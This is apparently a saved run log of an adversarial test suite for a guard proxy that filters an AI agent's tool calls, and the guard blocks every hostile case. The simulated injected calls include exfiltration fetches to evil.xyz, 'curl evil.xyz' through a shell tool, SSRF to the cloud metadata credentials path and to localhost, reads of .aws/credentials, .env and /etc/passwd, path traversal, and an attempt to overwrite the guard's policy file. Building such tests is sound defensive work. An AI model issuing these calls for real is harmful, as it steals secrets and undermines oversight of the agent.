@@ -1,0 +1,271 @@
+# Aegis S3b — drive.py, full adversarial suite (S1 + S3a + S3b cases)
+# host: macOS 26.5.1, Python 3.14.3, Sat Aug 15 13:12:25 IST 2026
+# policy: policy.example.json (fetch declares "egress": true)
+
+[aegis] created audit store /private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/ev/audit.db (mode 0600)
+[aegis] {"ts": 1786779745.782, "event": "started", "policy": "/private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/s3b-policy.json", "roots": ["/Users/adarsh/code/aegis-testlab/workspace"], "server": ["/Library/Frameworks/Python.framework/Versions/3.14/bin/python3", "/Users/adarsh/code/aegis/tests/mock_fs_server.py"], "audit": "/private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/ev/audit.db", "audit_head_id": 0, "audit_head_hash": "0000000000000000"}
+[aegis] {"ts": 1786779745.786, "event": "tool_call", "tool": "read_file", "effect": "allow", "rule": "tool_rules.read_file", "reason": "matched allow rule", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/config.txt"]}
+[aegis] {"ts": 1786779745.786, "event": "audit_row", "id": 1, "hash": "f6cce7bed0962705"}
+[aegis] {"ts": 1786779745.8, "event": "tool_call", "tool": "write_file", "effect": "allow", "rule": "tool_rules.write_file", "reason": "matched allow rule", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/notes.txt"]}
+[aegis] {"ts": 1786779745.8, "event": "audit_row", "id": 2, "hash": "c7d5d403c53ce4bc"}
+[aegis] {"ts": 1786779745.8, "event": "tool_call", "tool": "read_file", "effect": "deny", "rule": "deny_paths", "reason": "path matches deny rule '**/.aws/**'", "paths": ["/Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials"]}
+[aegis] {"ts": 1786779745.8, "event": "audit_row", "id": 3, "hash": "dd1f55bfdae74863"}
+[aegis] {"ts": 1786779745.8, "event": "tool_call", "tool": "read_file", "effect": "deny", "rule": "deny_paths", "reason": "path matches deny rule '**/.aws/**'", "paths": ["/Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials"]}
+[aegis] {"ts": 1786779745.801, "event": "audit_row", "id": 4, "hash": "f9e46fbe805220d2"}
+[aegis] {"ts": 1786779745.801, "event": "tool_call", "tool": "read_file", "effect": "deny", "rule": "deny_paths", "reason": "path matches deny rule '.env'", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/.env"]}
+[aegis] {"ts": 1786779745.801, "event": "audit_row", "id": 5, "hash": "0b8544b652582e75"}
+[aegis] {"ts": 1786779745.801, "event": "tool_call", "tool": "write_file", "effect": "deny", "rule": "tool_rules.write_file.within", "reason": "path /private/tmp/aegis-exfil.txt is outside every allowed root for this tool", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/ok.txt", "/private/tmp/aegis-exfil.txt"]}
+[aegis] {"ts": 1786779745.801, "event": "audit_row", "id": 6, "hash": "7447e82608bb7ec4"}
+[aegis] {"ts": 1786779745.801, "event": "tool_call", "tool": "delete_file", "effect": "deny", "rule": "tool_rules.delete_file", "reason": "tool is denied by policy", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/config.txt"]}
+[aegis] {"ts": 1786779745.801, "event": "audit_row", "id": 7, "hash": "3901ace6232bfbab"}
+[aegis] {"ts": 1786779745.801, "event": "tool_call", "tool": "move_file", "effect": "deny", "rule": "tool_rules.move_file", "reason": "action requires human approval; approval loop is not implemented until S5", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/config.txt", "/Users/adarsh/code/aegis-testlab/workspace/moved.txt"]}
+[aegis] {"ts": 1786779745.801, "event": "audit_row", "id": 8, "hash": "5cefa09e2b6da2d0"}
+[aegis] {"ts": 1786779745.801, "event": "tool_call", "tool": "exec_shell", "effect": "deny", "rule": "default_effect", "reason": "tool 'exec_shell' not present in tool_rules", "paths": []}
+[aegis] {"ts": 1786779745.802, "event": "audit_row", "id": 9, "hash": "a7c4dd8c11d3889f"}
+[aegis] {"ts": 1786779745.802, "event": "tool_call", "tool": "write_file", "effect": "deny", "rule": "tool_rules.write_file.within", "reason": "path /private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/s3b-policy.json is outside every allowed root for this tool", "paths": ["/private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/s3b-policy.json"]}
+[aegis] {"ts": 1786779745.802, "event": "audit_row", "id": 10, "hash": "729d285d093fa761"}
+[aegis] {"ts": 1786779745.802, "event": "tool_call", "tool": "read_file", "effect": "deny", "rule": "malformed", "reason": "tool arguments are not an object", "paths": []}
+[aegis] {"ts": 1786779745.802, "event": "audit_row", "id": 11, "hash": "96cc979514b56550"}
+[aegis] {"ts": 1786779745.802, "event": "tool_call", "tool": "fetch", "effect": "allow", "rule": "tool_rules.fetch", "reason": "matched allow rule", "paths": []}
+[aegis] {"ts": 1786779745.802, "event": "audit_row", "id": 12, "hash": "ee9ff99c61f4a6af"}
+[aegis] {"ts": 1786779745.802, "event": "tool_call", "tool": "fetch", "effect": "allow", "rule": "tool_rules.fetch", "reason": "matched allow rule", "paths": []}
+[aegis] {"ts": 1786779745.803, "event": "audit_row", "id": 13, "hash": "4a2e1182a503c26a"}
+[aegis] {"ts": 1786779745.803, "event": "tool_call", "tool": "fetch", "effect": "deny", "rule": "egress_domain", "reason": "URL https://evil.xyz in arguments.url: host is not in allowed_domains", "paths": []}
+[aegis] {"ts": 1786779745.803, "event": "audit_row", "id": 14, "hash": "cc8d2d2af87d1fef"}
+[aegis] {"ts": 1786779745.803, "event": "tool_call", "tool": "fetch", "effect": "deny", "rule": "egress_domain", "reason": "URL http://93.184.216.34 in arguments.url: host is a raw IP literal; list the address explicitly in allowed_domains to permit it", "paths": []}
+[aegis] {"ts": 1786779745.803, "event": "audit_row", "id": 15, "hash": "5ef2f07cf2b0ce41"}
+[aegis] {"ts": 1786779745.803, "event": "tool_call", "tool": "fetch", "effect": "deny", "rule": "egress_domain", "reason": "URL http://169.254.169.254 in arguments.url: host is a raw IP literal \u2014 link-local address (cloud instance metadata lives here); list the address explicitly in allowed_domains to permit it", "paths": []}
+[aegis] {"ts": 1786779745.803, "event": "audit_row", "id": 16, "hash": "f70dd1fc4989f6e8"}
+[aegis] {"ts": 1786779745.803, "event": "tool_call", "tool": "fetch", "effect": "deny", "rule": "egress_domain", "reason": "URL http://localhost in arguments.url: host resolves to this machine (localhost/.local); list it explicitly in allowed_domains to permit it", "paths": []}
+[aegis] {"ts": 1786779745.803, "event": "audit_row", "id": 17, "hash": "f04fb64d321db464"}
+[aegis] {"ts": 1786779745.803, "event": "tool_call", "tool": "fetch", "effect": "deny", "rule": "egress_domain", "reason": "URL http://2130706433 in arguments.url: host is a raw IP literal \u2014 loopback address; list the address explicitly in allowed_domains to permit it", "paths": []}
+[aegis] {"ts": 1786779745.803, "event": "audit_row", "id": 18, "hash": "7cadf61ddafb42d4"}
+[aegis] {"ts": 1786779745.804, "event": "tool_call", "tool": "fetch", "effect": "deny", "rule": "egress_domain", "reason": "URL file:// in arguments.url: scheme 'file' is not http/https; only those two can be host-checked, so everything else is denied", "paths": []}
+[aegis] {"ts": 1786779745.804, "event": "audit_row", "id": 19, "hash": "ddf8a1fbe1c010e8"}
+[aegis] {"ts": 1786779745.804, "event": "tool_call", "tool": "fetch", "effect": "deny", "rule": "egress_domain", "reason": "URL https://evil.xyz in arguments.url: host is not in allowed_domains", "paths": []}
+[aegis] {"ts": 1786779745.804, "event": "audit_row", "id": 20, "hash": "eaa776e0d6c6b1b2"}
+[aegis] {"ts": 1786779745.804, "event": "tool_call", "tool": "fetch", "effect": "deny", "rule": "egress_domain", "reason": "URL https://evil.xyz in arguments.request.body.callback: host is not in allowed_domains", "paths": []}
+[aegis] {"ts": 1786779745.804, "event": "audit_row", "id": 21, "hash": "3712957427f38f3d"}
+[aegis] {"ts": 1786779745.804, "event": "tool_call", "tool": "write_file", "effect": "deny", "rule": "dlp", "reason": "argument arguments.content contains a value matching secret pattern 'aws_access_key_id'; the value is deliberately not recorded", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/deploy.sh"]}
+[aegis] {"ts": 1786779745.804, "event": "audit_row", "id": 22, "hash": "9158bbd8715ef597"}
+[aegis] {"ts": 1786779745.804, "event": "tool_call", "tool": "write_file", "effect": "deny", "rule": "dlp", "reason": "argument arguments.headers[1] contains a value matching secret pattern 'github_token'; the value is deliberately not recorded", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/ci.yml"]}
+[aegis] {"ts": 1786779745.804, "event": "audit_row", "id": 23, "hash": "17d61b430f923381"}
+[aegis] {"ts": 1786779745.804, "event": "tool_call", "tool": "write_file", "effect": "allow", "rule": "tool_rules.write_file", "reason": "matched allow rule", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/config.py"]}
+[aegis] {"ts": 1786779745.804, "event": "audit_row", "id": 24, "hash": "fdbd1b2ef216125e"}
+[aegis] {"ts": 1786779745.805, "event": "tool_call", "tool": "write_file", "effect": "allow", "rule": "tool_rules.write_file", "reason": "matched allow rule", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/README.md"]}
+[aegis] {"ts": 1786779745.805, "event": "audit_row", "id": 25, "hash": "9e9f0a35794749cf"}
+[aegis] {"ts": 1786779745.805, "event": "tool_call", "tool": "write_file", "effect": "deny", "rule": "dlp", "reason": "argument arguments.content contains a value matching secret pattern 'aws_access_key_id'; the value is deliberately not recorded", "paths": ["/Users/adarsh/code/aegis-testlab/workspace/deploy2.sh"]}
+[aegis] {"ts": 1786779745.805, "event": "audit_row", "id": 26, "hash": "101f4c1ddc3017a8"}
+[aegis] {"ts": 1786779745.805, "event": "tool_call", "tool": "fetch", "effect": "deny", "rule": "egress_domain", "reason": "URL https://docs.python.org in arguments.url: host is not in allowed_domains", "paths": []}
+[aegis] {"ts": 1786779745.805, "event": "audit_row", "id": 27, "hash": "2ed2a2ad2b98c059"}
+[aegis] {"ts": 1786779745.808, "event": "stopped", "seen": 27, "allowed": 6, "denied": 21, "audit_failures": 0, "audit_head_id": 27, "audit_head_hash": "2ed2a2ad2b98c059570b2661624f7aca60b88d22fae28c6a7210fda28443be88", "head_anchor": "/private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/ev/aegis-head.txt"}
+fixtures ready under /Users/adarsh/code/aegis-testlab
+policy: /private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/s3b-policy.json
+
+==============================================================================
+
+[ALLOWED] T1  legitimate read inside workspace
+  tool=read_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/config.txt'}
+  | MOCK SERVER READ /Users/adarsh/code/aegis-testlab/workspace/config.txt:
+  | conveyor_speed = 40
+
+[ALLOWED] T1  legitimate write inside workspace
+  tool=write_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/notes.txt', 'content': 'hello'}
+  | MOCK SERVER WROTE /Users/adarsh/code/aegis-testlab/workspace/notes.txt
+
+[DENIED ] T2  injected: read fixture AWS credentials (absolute)
+  tool=read_file args={'path': '/Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials'}
+  | AEGIS DENIED: read_file
+  | Reason: path matches deny rule '**/.aws/**'
+  | Rule: deny_paths
+  | Paths: /Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T2  injected: escape workspace via ../ traversal
+  tool=read_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/../fake-secrets/.aws/credentials'}
+  | AEGIS DENIED: read_file
+  | Reason: path matches deny rule '**/.aws/**'
+  | Rule: deny_paths
+  | Paths: /Users/adarsh/code/aegis-testlab/fake-secrets/.aws/credentials
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T2  injected: read .env inside the allowed workspace
+  tool=read_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/.env'}
+  | AEGIS DENIED: read_file
+  | Reason: path matches deny rule '.env'
+  | Rule: deny_paths
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/.env
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T2  injected: exfil via second path arg (destination)
+  tool=write_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/ok.txt', 'destination': '/tmp/aegis-exfil.txt', 'content': 'x'}
+  | AEGIS DENIED: write_file
+  | Reason: path /private/tmp/aegis-exfil.txt is outside every allowed root for this tool
+  | Rule: tool_rules.write_file.within
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/ok.txt, /private/tmp/aegis-exfil.txt
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T1  destructive tool denied outright
+  tool=delete_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/config.txt'}
+  | AEGIS DENIED: delete_file
+  | Reason: tool is denied by policy
+  | Rule: tool_rules.delete_file
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/config.txt
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T5  ASK collapses to deny (no S5 approval loop yet)
+  tool=move_file args={'source': '/Users/adarsh/code/aegis-testlab/workspace/config.txt', 'destination': '/Users/adarsh/code/aegis-testlab/workspace/moved.txt'}
+  | AEGIS DENIED: move_file
+  | Reason: action requires human approval; approval loop is not implemented until S5
+  | Rule: tool_rules.move_file
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/config.txt, /Users/adarsh/code/aegis-testlab/workspace/moved.txt
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T3  unknown tool from a poisoned server
+  tool=exec_shell args={'command': 'curl evil.xyz'}
+  | AEGIS DENIED: exec_shell
+  | Reason: tool 'exec_shell' not present in tool_rules
+  | Rule: default_effect
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] T2  attempt to overwrite the Aegis policy file itself
+  tool=write_file args={'path': '/private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/s3b-policy.json', 'content': '{}'}
+  | AEGIS DENIED: write_file
+  | Reason: path /private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/s3b-policy.json is outside every allowed root for this tool
+  | Rule: tool_rules.write_file.within
+  | Paths: /private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/s3b-policy.json
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] MAL malformed arguments (fail-closed path)
+  tool=read_file args=not-an-object
+  | AEGIS DENIED: read_file
+  | Reason: tool arguments are not an object
+  | Rule: malformed
+  | This action was blocked by policy and was not forwarded to the server.
+
+[ALLOWED] S3a T2 fetch an allowed domain
+  tool=fetch args={'url': 'https://api.example.com/v1/status'}
+  | MOCK SERVER EXECUTED fetch on 
+
+[ALLOWED] S3a T2 fetch a subdomain of an allowed domain
+  tool=fetch args={'url': 'https://cdn.example.com/asset.js'}
+  | MOCK SERVER EXECUTED fetch on 
+
+[DENIED ] S3a T2 exfil to an unlisted domain
+  tool=fetch args={'url': 'https://evil.xyz/collect?data=hunter2'}
+  | AEGIS DENIED: fetch
+  | Reason: URL https://evil.xyz in arguments.url: host is not in allowed_domains
+  | Rule: egress_domain
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3a T2 raw IP host (public address, still a literal)
+  tool=fetch args={'url': 'http://93.184.216.34/collect'}
+  | AEGIS DENIED: fetch
+  | Reason: URL http://93.184.216.34 in arguments.url: host is a raw IP literal; list the address explicitly in allowed_domains to permit it
+  | Rule: egress_domain
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3a T2 SSRF: cloud instance metadata
+  tool=fetch args={'url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'}
+  | AEGIS DENIED: fetch
+  | Reason: URL http://169.254.169.254 in arguments.url: host is a raw IP literal — link-local address (cloud instance metadata lives here); list the address explicitly in allowed_domains to permit it
+  | Rule: egress_domain
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3a T2 SSRF: localhost admin port
+  tool=fetch args={'url': 'http://localhost:8080/admin/shutdown'}
+  | AEGIS DENIED: fetch
+  | Reason: URL http://localhost in arguments.url: host resolves to this machine (localhost/.local); list it explicitly in allowed_domains to permit it
+  | Rule: egress_domain
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3a T2 SSRF: loopback written as an integer (http://2130706433/)
+  tool=fetch args={'url': 'http://2130706433/admin'}
+  | AEGIS DENIED: fetch
+  | Reason: URL http://2130706433 in arguments.url: host is a raw IP literal — loopback address; list the address explicitly in allowed_domains to permit it
+  | Rule: egress_domain
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3a T2 non-http scheme: file://
+  tool=fetch args={'url': 'file:///etc/passwd'}
+  | AEGIS DENIED: fetch
+  | Reason: URL file:// in arguments.url: scheme 'file' is not http/https; only those two can be host-checked, so everything else is denied
+  | Rule: egress_domain
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3a T2 userinfo trick: allowed host as username, real host is evil.xyz
+  tool=fetch args={'url': 'https://api.example.com@evil.xyz/collect'}
+  | AEGIS DENIED: fetch
+  | Reason: URL https://evil.xyz in arguments.url: host is not in allowed_domains
+  | Rule: egress_domain
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3a T2 URL nested three levels deep in an object
+  tool=fetch args={'request': {'body': {'callback': 'https://evil.xyz/beacon'}}}
+  | AEGIS DENIED: fetch
+  | Reason: URL https://evil.xyz in arguments.request.body.callback: host is not in allowed_domains
+  | Rule: egress_domain
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3a A1 AWS access key id in a tool argument
+  tool=write_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/deploy.sh', 'content': 'export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n'}
+  | AEGIS DENIED: write_file
+  | Reason: argument arguments.content contains a value matching secret pattern 'aws_access_key_id'; the value is deliberately not recorded
+  | Rule: dlp
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/deploy.sh
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3a A1 GitHub token nested in a list
+  tool=write_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/ci.yml', 'headers': ['Accept: application/json', 'Authorization: token ghp_0123456789abcdefghijklmnopqrstuvwxyz'], 'content': 'steps:\n'}
+  | AEGIS DENIED: write_file
+  | Reason: argument arguments.headers[1] contains a value matching secret pattern 'github_token'; the value is deliberately not recorded
+  | Rule: dlp
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/ci.yml
+  | This action was blocked by policy and was not forwarded to the server.
+
+[ALLOWED] S3a FP ordinary code mentioning 'key' + a 40-char git SHA (must ALLOW)
+  tool=write_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/config.py', 'content': "# pinned at commit 9f2b1c4e8a7d6f3b2c1a0e9d8c7b6a5f4e3d2c1b\nfor key in config.keys():\n    api_key = os.environ.get('API_KEY')\n    # the private key lives in the keychain, not here\n    secret = keyring.get_password('svc', key)\n"}
+  | MOCK SERVER WROTE /Users/adarsh/code/aegis-testlab/workspace/config.py
+
+[ALLOWED] S3b FP write a README containing an ordinary doc link (must ALLOW)
+  tool=write_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/README.md', 'content': 'See https://docs.python.org/3/library/json.html\n'}
+  | MOCK SERVER WROTE /Users/adarsh/code/aegis-testlab/workspace/README.md
+
+[DENIED ] S3b DLP still fires on a non-egress tool (must DENY)
+  tool=write_file args={'path': '/Users/adarsh/code/aegis-testlab/workspace/deploy2.sh', 'content': 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n'}
+  | AEGIS DENIED: write_file
+  | Reason: argument arguments.content contains a value matching secret pattern 'aws_access_key_id'; the value is deliberately not recorded
+  | Rule: dlp
+  | Paths: /Users/adarsh/code/aegis-testlab/workspace/deploy2.sh
+  | This action was blocked by policy and was not forwarded to the server.
+
+[DENIED ] S3b egress check still applies to the flagged fetch tool (must DENY)
+  tool=fetch args={'url': 'https://docs.python.org/3/library/json.html'}
+  | AEGIS DENIED: fetch
+  | Reason: URL https://docs.python.org in arguments.url: host is not in allowed_domains
+  | Rule: egress_domain
+  | This action was blocked by policy and was not forwarded to the server.
+
+==============================================================================
+RESULT: 6 allowed, 21 denied  (expected: 6 allowed, 21 denied)
+exfil file created? False  (expected: False)
+
+==============================================================================
+HEAD ANCHOR WRITTEN ON CLEAN SHUTDOWN
+==============================================================================
+# Aegis audit head anchor. Written on clean shutdown.
+# NOT tamper-proof: an attacker who can rewrite the database can
+# rewrite this file too. Keep a copy somewhere Aegis cannot write.
+db=audit.db
+head_id=27
+head_hash=2ed2a2ad2b98c059570b2661624f7aca60b88d22fae28c6a7210fda28443be88
+written_at=1786779745.808
+
+$ python3 aegis/verify.py   (anchor picked up automatically)
+OK: 27 row(s) verified, chain intact
+db:     /private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/ev/audit.db
+head:   2ed2a2ad2b98c059570b2661624f7aca60b88d22fae28c6a7210fda28443be88
+anchor: /private/tmp/claude-501/-Users-adarsh-code-aegis/fa56011e-ac34-42bb-9285-1b529812f499/scratchpad/ev/aegis-head.txt (written next to the db; not tamper-proof)
+anchor verified at row 27
+note: the anchor file lives beside the database and is not signed — it raises the effort of a silent truncation, it does not prevent one. A hash held outside this machine is worth more.
+exit=0
